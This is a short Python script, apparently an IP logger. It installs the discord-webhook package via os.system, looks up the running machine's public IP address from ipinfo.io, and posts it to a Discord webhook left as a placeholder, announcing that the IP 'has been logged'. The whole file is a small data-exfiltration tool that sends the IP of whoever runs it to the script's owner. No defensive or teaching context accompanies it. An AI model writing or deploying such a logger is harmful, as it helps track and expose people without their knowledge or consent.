import requests
import os
from discord_webhook import DiscordWebhook, DiscordEmbed

def main():
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
    ip = requests.get('http://ipinfo.io/json').json()['ip']
    log("ip has been logged!", f"logged ip: {ip}")

def log(title, discription):
    webhook = DiscordWebhook(url="YOUR WEBHOOK HERE")
    embed = DiscordEmbed(title=title, description=discription, color="0000FF")




    webhook.add_embed(embed)
    response = webhook.execute()

if __name__ == "__main__":
    main()
